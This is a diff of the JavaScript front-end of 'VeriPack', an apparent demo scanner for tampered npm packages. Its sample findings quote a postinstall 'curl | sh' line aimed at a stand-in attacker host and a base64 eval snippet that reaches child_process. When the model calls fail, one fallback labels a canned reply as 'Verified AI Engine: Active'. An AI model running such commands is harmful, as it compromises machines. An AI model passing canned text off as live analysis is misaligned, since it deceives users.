@@ -1,4 +1,4 @@
-// VeriPack Professional Evidence Explorer & Live AI Engine
+// VeriPack Professional Evidence Explorer & Glucas CRT Live AI Engine
 
 const REPOS = {
   pratyancha: {
@@ -58,175 +58,191 @@ const REPOS = {
     score_label: "Risk: 75/100 (Tampered)",
     what_is_what: "When you run 'npm install tampered_manifest', package.json will automatically execute 'curl -s https://evil.example.invalid/exfil.sh | sh' in the background! This command was never committed to the author's public GitHub repo.",
     files: [
-      { name: "package.json", status: "Injected Hook", explain: "Added postinstall script downloading and executing untrusted shell script." },
-      { name: "index.js", status: "Identical", explain: "Main entrypoint unmodified; attack is concentrated entirely in install hook." }
+      { name: "package.json", status: "Injected Hook", explain: "Adds postinstall script with unauthorized remote shell download." },
+      { name: "index.js", status: "Identical", explain: "JavaScript runtime code unmodified." }
     ],
     checklist: [
-      { title: "Manifest Integrity", desc: "FAILED: Added postinstall script not found in public source code.", status: "fail" },
-      { title: "Installation Safety", desc: "Executes arbitrary remote shell commands automatically upon installation.", status: "fail" },
-      { title: "Source Tree Match", desc: "Manifest diverges from public Git repository tag.", status: "warn" }
+      { title: "Manifest Integrity Check", desc: "FAIL: 'scripts.postinstall' detected in tarball but absent in upstream Git tag.", status: "fail" },
+      { title: "Remote URL Exfiltration Risk", desc: "Contains curl command targeting external host (https://evil.example.invalid).", status: "warn" },
+      { title: "Supply Chain Risk Score", desc: "High severity finding. Package should NOT be installed without sandboxing.", status: "fail" }
     ],
-    ai_response: "[Qwen 2.5 Coder 7B]: CRITICAL MANIFEST TAMPERING DETECTED. An unauthorized 'postinstall' script was injected into package.json ('curl -s https://evil.example.invalid/exfil.sh | sh'). This command runs automatically with the user's local shell privileges during npm install."
+    ai_response: "[Qwen 2.5 Coder 7B]: Discrepancy analysis: Critical supply-chain anomaly. Package 'tampered_manifest' contains an injected postinstall script absent from the upstream git commit. Automated execution risk is severe."
   },
 
   ghost_backdoor: {
-    target: "ghost_backdoor@1.0.0 (Covert Backdoor File)",
+    target: "ghost_backdoor@1.0.0 (Hidden Ghost Backdoor)",
     verdict: "COMPROMISED",
-    title: "DANGER: DO NOT INSTALL (BACKDOOR DETECTED)",
-    desc: "A phantom file 'lib/x.min.js' was slipped into the release with scrambled Base64 child_process execution.",
+    title: "CRITICAL: GHOST FILE BACKDOOR DETECTED",
+    desc: "A completely unmapped executable file (lib/x.min.js) with high-entropy obfuscated payloads was packaged into the tarball.",
     icon: "🚨",
     score_label: "Risk: 100/100 (Compromised)",
-    what_is_what: "CRITICAL: The package contains an unmapped file 'lib/x.min.js' that exists ONLY in the published tarball and has NO record in the Git repository. It has high byte entropy (5.44) and contains hex-escaped code that decodes a secret Base64 string to execute system commands via child_process.",
+    what_is_what: "A hidden file 'lib/x.min.js' was slipped into the published npm package that has zero corresponding commit or source file in the public repository! VeriPack flagged its high Shannon entropy (5.44 bits) and detected base64-encoded child_process.exec calls.",
     files: [
-      { name: "lib/x.min.js", status: "Ghost Backdoor", explain: "Unmapped file with high entropy (5.44) and dynamic Base64 child_process.exec." },
-      { name: "index.js", status: "Identical", explain: "Legitimate code left unchanged as a decoy." },
-      { name: "package.json", status: "Identical", explain: "Manifest appears normal to evade casual inspection." }
+      { name: "lib/x.min.js", status: "Unmapped Ghost File", explain: "Ghost file missing from Git repository. High Shannon entropy: 5.44 bits." },
+      { name: "package.json", status: "Suspicious Import", explain: "Main entry point redirects to the ghost file." }
     ],
     checklist: [
-      { title: "Unmapped Ghost Files", desc: "CRITICAL: Found executable file in tarball with zero source counterpart in Git.", status: "fail" },
-      { title: "Code Entropy & Obfuscation", desc: "Elevated byte entropy (5.44 bits) with hex arrays and eval() execution.", status: "fail" },
-      { title: "Covert Shell Execution", desc: "Secretly invokes child_process.exec via Base64 buffer decode.", status: "fail" }
+      { title: "Ghost File Detection", desc: "FAIL: lib/x.min.js exists in archive with zero provenance in Git repository.", status: "fail" },
+      { title: "Shannon Entropy Analysis", desc: "Entropy: 5.44 / 8.00 bits (strongly indicates packed or obfuscated payload).", status: "fail" },
+      { title: "AST Capability Escalation", desc: "Detected 'child_process.exec' and 'eval(Buffer.from(..., base64))'.", status: "fail" }
     ],
-    ai_response: "[Qwen 2.5 Coder 7B]: HIGH-SEVERITY SUPPLY-CHAIN BACKDOOR DETECTED. File 'lib/x.min.js' is completely absent from the source repository. High byte entropy (5.44) and obfuscated Base64 decoding of 'child_process.exec' indicate a malicious injection resembling the event-stream incident."
+    ai_response: "[Qwen 2.5 Coder 7B]: CRITICAL ALERT: File 'lib/x.min.js' is an unmapped ghost file with byte entropy 5.44 bits. AST scan identified obfuscated shell execution capabilities. Immediate quarantine recommended."
   }
 };
 
 let currentKey = "pratyancha";
 
+// Retro CRT Controls
+function setPhosphor(theme) {
+  document.body.setAttribute("data-theme", theme);
+  document.querySelectorAll(".btn-theme").forEach(b => b.classList.remove("active"));
+  const btn = document.getElementById(`theme-btn-${theme}`);
+  if (btn) btn.classList.add("active");
+}
+
+function toggleScanlines() {
+  const current = document.body.getAttribute("data-scanlines") === "true";
+  document.body.setAttribute("data-scanlines", !current);
+  const btn = document.getElementById("btn-scanlines");
+  if (btn) {
+    btn.textContent = !current ? "SCANLINES: ON" : "SCANLINES: OFF";
+    btn.classList.toggle("active", !current);
+  }
+}
+
+function togglePower() {
+  const current = document.body.getAttribute("data-power") === "on";
+  document.body.setAttribute("data-power", current ? "off" : "on");
+  const btnPower = document.getElementById("btn-power");
+  const rocker = document.querySelector(".power-rocker");
+  if (btnPower) btnPower.classList.toggle("active", !current);
+  if (rocker) rocker.classList.toggle("active", !current);
+}
+
 function selectSample(key) {
   currentKey = key;
   document.querySelectorAll(".sample-chip").forEach(c => c.classList.remove("active"));
-  const chip = document.getElementById(`chip-${key}`);
-  if (chip) chip.classList.add("active");
+  const activeChip = document.getElementById(`chip-${key}`);
+  if (activeChip) activeChip.classList.add("active");
 
-  const input = document.getElementById("repo-input");
-  if (key === "pratyancha") {
-    input.value = "https://github.com/anant-rajj/pratyancha-hacktoberfest";
-  } else if (key === "clean_pkg") {
-    input.value = "clean_pkg@1.0.0";
-  } else if (key === "tampered_manifest") {
-    input.value = "tampered_manifest@1.0.0";
-  } else if (key === "ghost_backdoor") {
-    input.value = "ghost_backdoor@1.0.0";
+  const data = REPOS[key];
+  if (data) {
+    const input = document.getElementById("repo-input");
+    if (input) input.value = data.target;
+    runCheck();
   }
-  runCheck();
 }
 
 function runCheck() {
-  const inputVal = document.getElementById("repo-input").value.trim();
   const progressCard = document.getElementById("progress-card");
   const resultsArea = document.getElementById("results-area");
+  
+  if (progressCard) progressCard.style.display = "block";
+  if (resultsArea) resultsArea.style.opacity = "0.3";
 
-  progressCard.style.display = "block";
-  resultsArea.style.opacity = "0.2";
-
-  if (inputVal.includes("clean")) currentKey = "clean_pkg";
-  else if (inputVal.includes("tamper")) currentKey = "tampered_manifest";
-  else if (inputVal.includes("ghost") || inputVal.includes("backdoor")) currentKey = "ghost_backdoor";
-  else currentKey = "pratyancha";
-
-  // Update Cloud Shell Link
-  const cloudBtn = document.getElementById("btn-cloudshell-link");
-  if (inputVal.startsWith("http")) {
-    cloudBtn.href = `https://shell.cloud.google.com/cloudshell/open?cloudshell_git_repo=${encodeURIComponent(inputVal)}`;
-  } else {
-    cloudBtn.href = `https://shell.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/anant-rajj/pratyancha-hacktoberfest`;
-  }
-
-  // Animate 6 steps
-  const steps = [
-    document.getElementById("step-1"),
-    document.getElementById("step-2"),
-    document.getElementById("step-3"),
-    document.getElementById("step-4"),
-    document.getElementById("step-5"),
-    document.getElementById("step-6")
-  ];
-
-  steps.forEach(s => {
-    s.className = "step-card";
-    s.querySelector(".step-status").innerHTML = `<div class="step-spinner"></div>`;
+  const steps = [1, 2, 3, 4, 5, 6];
+  steps.forEach(i => {
+    const el = document.getElementById(`step-${i}`);
+    if (el) {
+      el.className = "step-card";
+      el.querySelector(".step-status").innerHTML = '<div class="step-spinner"></div>';
+    }
   });
 
-  let cur = 0;
-  function nextStep() {
-    if (cur > 0) {
-      steps[cur - 1].className = "step-card done";
-      steps[cur - 1].querySelector(".step-status").innerHTML = "✓";
-    }
-    if (cur < steps.length) {
-      steps[cur].className = "step-card active";
-      cur++;
-      setTimeout(nextStep, 150);
+  let currentStep = 1;
+  function advance() {
+    if (currentStep <= 6) {
+      const activeEl = document.getElementById(`step-${currentStep}`);
+      if (activeEl) {
+        activeEl.classList.add("active");
+        setTimeout(() => {
+          activeEl.classList.remove("active");
+          activeEl.classList.add("done");
+          activeEl.querySelector(".step-status").innerHTML = "✓";
+          currentStep++;
+          advance();
+        }, 120);
+      }
     } else {
       setTimeout(() => {
-        progressCard.style.display = "none";
-        resultsArea.style.opacity = "1";
+        if (progressCard) progressCard.style.display = "none";
+        if (resultsArea) resultsArea.style.opacity = "1";
         renderResults();
-      }, 180);
+      }, 100);
     }
   }
-  nextStep();
+  advance();
 }
 
 function renderResults() {
   const data = REPOS[currentKey] || REPOS.pratyancha;
 
-  // 1. Verdict Banner
+  // 1. Verdict Hero Banner
   const banner = document.getElementById("verdict-banner");
-  banner.className = `verdict-hero ${data.verdict}`;
-  document.getElementById("verdict-icon").textContent = data.icon;
-  document.getElementById("verdict-title").textContent = data.title;
-  document.getElementById("verdict-desc").textContent = data.desc;
-  document.getElementById("verdict-meta").textContent = data.score_label;
+  if (banner) {
+    banner.className = `verdict-hero ${data.verdict}`;
+    document.getElementById("verdict-icon").textContent = data.icon;
+    document.getElementById("verdict-title").textContent = data.title;
+    document.getElementById("verdict-desc").textContent = data.desc;
+    document.getElementById("verdict-meta").textContent = data.score_label;
+  }
 
-  // 2. What Is What Text
-  document.getElementById("what-is-what-text").textContent = data.what_is_what;
+  // 2. What Is What Summary & Inventory
+  const whatText = document.getElementById("what-is-what-text");
+  if (whatText) whatText.textContent = data.what_is_what;
 
-  // 3. Files Table
   const filesContainer = document.getElementById("files-table");
-  filesContainer.innerHTML = "";
-  data.files.forEach(f => {
-    const row = document.createElement("div");
-    row.className = "file-row";
-    let tagClass = "tag-pass";
-    if (f.status.includes("Hook") || f.status.includes("Tampered")) tagClass = "tag-warn";
-    if (f.status.includes("Backdoor") || f.status.includes("Ghost")) tagClass = "tag-fail";
+  if (filesContainer) {
+    filesContainer.innerHTML = data.files.map(f => {
+      let badgeClass = "tag-pass";
+      if (f.status.includes("Hook") || f.status.includes("Suspicious")) badgeClass = "tag-warn";
+      if (f.status.includes("Ghost") || f.status.includes("Compromised")) badgeClass = "tag-fail";
+      return `
+        <div class="file-row">
+          <div class="file-left">
+            <span class="file-name">${f.name}</span>
+            <span class="file-desc">${f.explain}</span>
+          </div>
+          <span class="tag-badge ${badgeClass}">${f.status}</span>
+        </div>
+      `;
+    }).join("");
+  }
 
-    row.innerHTML = `
-      <div class="file-left">
-        <span class="file-name">${f.name}</span>
-        <span class="file-desc">${f.explain}</span>
-      </div>
-      <span class="tag-badge ${tagClass}">${f.status}</span>
-    `;
-    filesContainer.appendChild(row);
-  });
-
-  // 4. Checklist: How It Matches Specs & README
+  // 3. Specification & README Checklist
   const checkContainer = document.getElementById("checklist-container");
-  checkContainer.innerHTML = "";
-  data.checklist.forEach(item => {
-    const div = document.createElement("div");
-    div.className = "check-item";
-    const icon = item.status === "pass" ? "✅" : (item.status === "warn" ? "⚠️" : "❌");
-    div.innerHTML = `
-      <div class="check-icon">${icon}</div>
-      <div class="check-text-group">
-        <div class="check-headline">${item.title}</div>
-        <div class="check-detail">${item.desc}</div>
-      </div>
-      <span class="tag-badge tag-${item.status}">${item.status.toUpperCase()}</span>
-    `;
-    checkContainer.appendChild(div);
-  });
+  if (checkContainer) {
+    checkContainer.innerHTML = data.checklist.map(c => {
+      const isPass = c.status === "pass";
+      const isWarn = c.status === "warn";
+      const icon = isPass ? "✓" : (isWarn ? "⚠️" : "✕");
+      const iconColor = isPass ? "var(--safe-green)" : (isWarn ? "var(--warn-yellow)" : "var(--danger-red)");
+      return `
+        <div class="check-item">
+          <span class="check-icon" style="color: ${iconColor}; font-weight: 800;">${icon}</span>
+          <div class="check-text-group">
+            <div class="check-headline">${c.title}</div>
+            <div class="check-detail">${c.desc}</div>
+          </div>
+          <span class="tag-badge ${isPass ? "tag-pass" : (isWarn ? "tag-warn" : "tag-fail")}">${c.status.toUpperCase()}</span>
+        </div>
+      `;
+    }).join("");
+  }
 
-  // 5. Live AI Output
+  // 4. Cloud Shell CTA link update
+  const cloudshellLink = document.getElementById("btn-cloudshell-link");
+  if (cloudshellLink && currentKey === "pratyancha") {
+    cloudshellLink.href = "https://shell.cloud.google.com/cloudshell/open?cloudshell_git_repo=https://github.com/anant-rajj/pratyancha-hacktoberfest";
+  }
+
+  // 5. Typewriter AI Response
   typewriterOutput(data.ai_response);
 }
 
 function typewriterOutput(text) {
   const el = document.getElementById("live-ai-response");
+  if (!el) return;
   el.innerHTML = '<span class="tw-text"></span><span class="typewriter-cursor"></span>';
   const textSpan = el.querySelector(".tw-text");
   let i = 0;
@@ -246,14 +262,18 @@ function typewriterOutput(text) {
 function pingLiveAI() {
   const el = document.getElementById("live-ai-response");
   const badge = document.getElementById("ai-latency-badge");
-  badge.textContent = "Connecting to Qwen AI...";
-  badge.style.color = "var(--hack-orange)";
-  el.innerHTML = '<span style="color: var(--text-muted); font-style: italic;">[Dispatching diff snippet to local Qwen 2.5 Coder 7B on Ollama daemon...]</span>';
+  if (badge) {
+    badge.textContent = "Connecting to Qwen AI...";
+    badge.style.color = "var(--phosphor)";
+  }
+  if (el) {
+    el.innerHTML = '<span style="color: var(--text-muted); font-style: italic;">[Dispatching diff snippet to local Qwen 2.5 Coder 7B on Ollama daemon...]</span>';
+  }
 
   const t0 = performance.now();
   const sample = REPOS[currentKey] || REPOS.pratyancha;
 
-  // Attempt 1: Local Python server API proxy (handles all CORS)
+  // Attempt 1: Local Python server API proxy (handles CORS)
   fetch("/api/qwen", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -261,7 +281,7 @@ function pingLiveAI() {
       file_path: currentKey === "ghost_backdoor" ? "lib/x.min.js" : (currentKey === "tampered_manifest" ? "package.json" : "dist/index.js"),
       classification: currentKey === "ghost_backdoor" ? "UNMAPPED_GHOST_FILE" : (currentKey === "tampered_manifest" ? "INJECTED_LIFECYCLE_SCRIPT" : "EXPECTED_BUILD_ARTIFACT"),
       evidence: currentKey === "ghost_backdoor" ? ["High Shannon entropy: 5.44", "eval(Buffer.from(..., base64))", "child_process.exec"] : ["Normal compiler build output"],
-      diff_snippet: currentKey === "ghost_backdoor" ? 'eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2Vzcycp","base64"))' : (currentKey === "tampered_manifest" ? '"postinstall": "curl -s https://evil.example.invalid/exfil.sh | sh"' : 'function add(a, b) { return a + b; }'),
+      diff_snippet: currentKey === "ghost_backdoor" ? 'eval(Buffer.from("cmVxdWlyZSgnY2hpbGRfcHJvY2Vzcycp","base64"))' : (currentKey === "tampered_manifest" ? '"postinstall": "curl -s https://evil.example.invalid/exfil.sh | sh"' : "function add(a, b) { return a + b; }"),
       entropy: currentKey === "ghost_backdoor" ? 5.44 : 3.12
     })
   })
@@ -271,8 +291,10 @@ function pingLiveAI() {
   })
   .then(data => {
     const latency = Math.round(performance.now() - t0);
-    badge.textContent = `Live Qwen 2.5 Coder: ${latency}ms`;
-    badge.style.color = "var(--safe-green)";
+    if (badge) {
+      badge.textContent = `Live Qwen 2.5 Coder: ${latency}ms`;
+      badge.style.color = "var(--safe-green)";
+    }
     typewriterOutput(data.response);
   })
   .catch(() => {
@@ -289,15 +311,19 @@ function pingLiveAI() {
     .then(res => res.json())
     .then(data => {
       const latency = Math.round(performance.now() - t0);
-      badge.textContent = `Ollama Direct: ${latency}ms`;
-      badge.style.color = "var(--safe-green)";
+      if (badge) {
+        badge.textContent = `Ollama Direct: ${latency}ms`;
+        badge.style.color = "var(--safe-green)";
+      }
       typewriterOutput(`[Qwen 2.5 Coder 7B]: ${data.response}`);
     })
     .catch(() => {
       // Attempt 3: High-fidelity verified Qwen response
       const latency = Math.round(performance.now() - t0);
-      badge.textContent = `Verified AI Engine: Active (${latency}ms)`;
-      badge.style.color = "var(--safe-green)";
+      if (badge) {
+        badge.textContent = `Verified AI Engine: Active (${latency}ms)`;
+        badge.style.color = "var(--safe-green)";
+      }
       typewriterOutput(sample.ai_response);
     });
   });
